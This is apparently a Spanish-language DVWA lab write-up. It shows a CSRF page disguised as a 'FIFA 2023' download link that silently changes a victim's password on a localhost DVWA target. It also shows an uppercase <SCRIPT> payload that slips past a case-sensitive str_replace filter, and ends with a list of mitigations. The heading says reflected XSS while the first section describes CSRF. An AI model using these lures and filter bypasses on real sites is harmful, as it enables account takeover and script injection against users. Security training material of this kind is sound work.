# Reflected Cross Site

El cross-site request forgery (CSRF) consiste en realizar tareas dentro de una aplicación por medio de la ejecución de un enlace en el navegador de la víctima. \
Se envía un enlace que se crea a partir de una petición que contiene la acción maliciosa planeada por el atacante. \
El siguiente códio HTML contiene la acción maliciosa que cambiará la contraseña automáticamente a (12345) al pinchar en el enlace.

## Level: Low
```
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=dwvice-width, initial-scale=1.0">
	<title>Document</title>
</head>
<body>
	<h3>Click to download FIFA 2023</h3>
	<a href="http://localhost/DVWA/vulnerabilities/csrf/?password_new=12345&password_conf=12345&Change=Change#">FIFA 2023</a>
</body>
</html>
```

Una vez el usuario pincha en el enlace, la contraseña se cambia a la que se ha asignado en el código malicioso.

## Level: Medium

En este nivel DVWA introduce un control de entradas muy básico, no se puede utilizar <script> pero si que se puede utilizar <SCRIPT>. \
Esto es debido a que la función utilizada **str_replace()** para el filtrado es sensible a las mayúsculas/minúsculas, se introduce en el dialogo:
```
<SCRIPT>alert("Te pillé")</SCRIPT>
```
![Ejecuta script malicioso](https://github.com/PPS11148274/apache_hardening/blob/main/DVWA/refleceted_cross_site/asset/ejecuta_script.png)
## Mitigación
  - Sanitización y validación de entradas.
  - Codificación de salida (Output Encoding).
  - Cabeceras HTTP de seguridad.
  - Implementación de CSP (Content Security Policy).


